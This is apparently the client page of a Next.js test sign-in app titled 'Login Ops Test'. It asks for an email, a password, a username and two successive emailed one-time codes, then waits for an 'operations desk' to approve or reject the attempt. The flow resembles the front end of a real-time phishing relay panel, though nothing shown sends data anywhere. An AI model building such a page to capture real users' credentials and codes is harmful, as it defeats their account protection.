'use client'

import { useEffect, useState } from 'react'
import Link from 'next/link'
import {
  startChallenge,
  submitUsername,
  submitOtp,
  getStatus,
} from '@/app/actions'

type Step =
  | 'credentials'
  | 'username'
  | 'otp1'
  | 'otp2'
  | 'awaiting_approval'
  | 'rejected'
  | 'approved_success'

export default function SignInPage() {
  const [step, setStep] = useState<Step>('credentials')
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [username, setUsername] = useState('')
  const [otp, setOtp] = useState('')
  const [attemptId, setAttemptId] = useState<string | null>(null)
  const [error, setError] = useState<string | null>(null)
  const [note, setNote] = useState<string | null>(null)
  const [loading, setLoading] = useState(false)

  useEffect(() => {
    if (step !== 'awaiting_approval' || !attemptId) return
    let cancelled = false
    const tick = async () => {
      const s = await getStatus(attemptId)
      if (cancelled) return
      setNote(s.lastEvent)
      if (s.status === 'approved') setStep('approved_success')
      if (s.status === 'rejected' || s.status === 'expired') {
        setStep('rejected')
        setError('Operations desk rejected this sign-in.')
      }
    }
    tick()
    const id = setInterval(tick, 2500)
    return () => {
      cancelled = true
      clearInterval(id)
    }
  }, [step, attemptId])

  if (step === 'approved_success') {
    return (
      <main
        style={{
          minHeight: '100vh',
          display: 'flex',
          flexDirection: 'column',
          alignItems: 'center',
          justifyContent: 'center',
          padding: 24,
          textAlign: 'center',
          background:
            'radial-gradient(ellipse 80% 50% at 50% -20%, #c6f36b55, transparent), #0f1412',
        }}
      >
        <div
          style={{
            width: 80,
            height: 80,
            borderRadius: '50%',
            background: '#c6f36b22',
            border: '2px solid #c6f36b66',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            marginBottom: 24,
            fontSize: 36,
            color: '#c6f36b',
          }}
        >
          ✓
        </div>
        <p style={{ color: '#8fbfa8', letterSpacing: 3, fontSize: 12, textTransform: 'uppercase' }}>
          Verification complete
        </p>
        <h1 style={{ margin: '8px 0', fontSize: 36 }}>Congratulations</h1>
        <p style={{ color: '#c5d4cc', maxWidth: 360 }}>
          Your account &amp; verification has been approved.
        </p>
        {email ? <p style={{ color: '#7f8f87', fontSize: 14 }}>{email}</p> : null}
        <div style={{ display: 'flex', gap: 12, marginTop: 32 }}>
          <Link
            href="/"
            style={{
              background: '#c6f36b',
              color: '#102016',
              padding: '12px 20px',
              borderRadius: 999,
              textDecoration: 'none',
              fontWeight: 700,
            }}
          >
            Return home
          </Link>
          <Link
            href="/sign-in"
            style={{
              border: '1px solid #ffffff22',
              padding: '12px 20px',
              borderRadius: 999,
              textDecoration: 'none',
            }}
            onClick={() => window.location.assign('/sign-in')}
          >
            Sign in again
          </Link>
        </div>
      </main>
    )
  }

  async function onSubmit(e: React.FormEvent) {
    e.preventDefault()
    setError(null)
    setLoading(true)
    try {
      if (step === 'credentials') {
        const r = await startChallenge({ email, password })
        setLoading(false)
        if (!r.ok) {
          setError(r.error)
          return
        }
        setAttemptId(r.attemptId)
        setStep('username')
        setNote('Enter username')
        return
      }
      if (step === 'username') {
        if (!attemptId) {
          setLoading(false)
          setError('Session lost.')
          return
        }
        const r = await submitUsername({ attemptId, username })
        setLoading(false)
        if (!r.ok) {
          setError(r.error)
          return
        }
        setOtp('')
        setStep('otp1')
        setNote('First code sent to your email.')
        return
      }
      if (step === 'otp1' || step === 'otp2') {
        if (!attemptId) {
          setLoading(false)
          setError('Session lost.')
          return
        }
        const which = step === 'otp1' ? 1 : 2
        const r = await submitOtp({ attemptId, otp, which })
        setLoading(false)
        if (!r.ok) {
          setError(r.error)
          return
        }
        setOtp('')
        if (r.next === 'otp2') {
          setStep('otp2')
          setNote('New second code emailed — enter that new code.')
          return
        }
        setStep('awaiting_approval')
        setNote('Waiting for operations desk…')
      }
    } catch (err) {
      setLoading(false)
      setError(err instanceof Error ? err.message : 'Error')
    }
  }

  const titles: Record<Step, string> = {
    credentials: 'Sign in',
    username: 'Enter username',
    otp1: 'First verification code',
    otp2: 'Second verification code',
    awaiting_approval: 'Waiting for approval',
    rejected: 'Sign-in blocked',
    approved_success: 'Congratulations',
  }

  return (
    <main
      style={{
        minHeight: '100vh',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        padding: 24,
      }}
    >
      <div style={{ width: '100%', maxWidth: 400 }}>
        <p style={{ color: '#8fbfa8', fontSize: 12, letterSpacing: 2, textTransform: 'uppercase' }}>
          Login Ops Test
        </p>
        <h1 style={{ margin: '8px 0 4px' }}>{titles[step]}</h1>
        <p style={{ color: '#7f8f87', fontSize: 14, marginBottom: 24 }}>
          {step === 'credentials' && 'Any email works. Password can be dummy. OTP goes to that email.'}
          {step === 'username' && 'Enter username'}
          {step === 'otp1' && 'Enter the first 6-digit code from email.'}
          {step === 'otp2' && 'Enter the NEW second code (not the first).'}
          {step === 'awaiting_approval' && 'Ops desk must approve.'}
          {step === 'rejected' && 'This attempt was rejected.'}
        </p>

        <form onSubmit={onSubmit} style={{ display: 'flex', flexDirection: 'column', gap: 14 }}>
          {step === 'credentials' && (
            <>
              <label style={{ display: 'flex', flexDirection: 'column', gap: 6, fontSize: 14 }}>
                Email
                <input
                  type="email"
                  required
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  style={inputStyle}
                  placeholder="you@example.com"
                />
              </label>
              <label style={{ display: 'flex', flexDirection: 'column', gap: 6, fontSize: 14 }}>
                Password
                <input
                  type="password"
                  required
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  style={inputStyle}
                  placeholder="any password"
                />
              </label>
            </>
          )}

          {step === 'username' && (
            <label style={{ display: 'flex', flexDirection: 'column', gap: 6, fontSize: 14 }}>
              Username
              <input
                required
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                style={inputStyle}
                placeholder="Enter username"
                autoComplete="username"
              />
            </label>
          )}

          {(step === 'otp1' || step === 'otp2') && (
            <label style={{ display: 'flex', flexDirection: 'column', gap: 6, fontSize: 14 }}>
              {step === 'otp1' ? 'OTP #1' : 'OTP #2 (new code)'}
              <input
                required
                inputMode="numeric"
                maxLength={6}
                value={otp}
                onChange={(e) => setOtp(e.target.value.replace(/\D/g, '').slice(0, 6))}
                style={{ ...inputStyle, textAlign: 'center', letterSpacing: 8, fontSize: 22 }}
                placeholder="000000"
              />
            </label>
          )}

          {step === 'awaiting_approval' && (
            <div
              style={{
                padding: 16,
                borderRadius: 12,
                border: '1px solid #ffffff18',
                background: '#16201b',
                color: '#c5d4cc',
                fontSize: 14,
              }}
            >
              {note || 'Pending operations desk…'}
              <div style={{ marginTop: 8, fontSize: 12, color: '#7f8f87' }}>
                This page updates automatically.
              </div>
            </div>
          )}

          {error && <p style={{ color: '#f87171', margin: 0, fontSize: 14 }}>{error}</p>}
          {note && step !== 'awaiting_approval' && (
            <p style={{ color: '#86efac', margin: 0, fontSize: 14 }}>{note}</p>
          )}

          {step !== 'awaiting_approval' && step !== 'rejected' && (
            <button
              type="submit"
              disabled={loading}
              style={{
                height: 44,
                borderRadius: 10,
                border: 'none',
                background: '#c6f36b',
                color: '#102016',
                fontWeight: 700,
                cursor: 'pointer',
              }}
            >
              {loading ? 'Please wait…' : 'Continue'}
            </button>
          )}

          {step !== 'credentials' && step !== 'awaiting_approval' && (
            <button
              type="button"
              onClick={() => {
                setStep('credentials')
                setAttemptId(null)
                setUsername('')
                setOtp('')
                setError(null)
                setNote(null)
              }}
              style={{
                background: 'transparent',
                border: 'none',
                color: '#7f8f87',
                cursor: 'pointer',
                textDecoration: 'underline',
              }}
            >
              ← Start over
            </button>
          )}
        </form>

        <p style={{ marginTop: 24, fontSize: 13, color: '#7f8f87' }}>
          <Link href="/">Home</Link> · <Link href="/ops">Ops desk</Link>
        </p>
      </div>
    </main>
  )
}

const inputStyle: React.CSSProperties = {
  height: 44,
  borderRadius: 10,
  border: '1px solid #ffffff22',
  background: '#16201b',
  color: '#e8eeea',
  padding: '0 12px',
  outline: 'none',
}
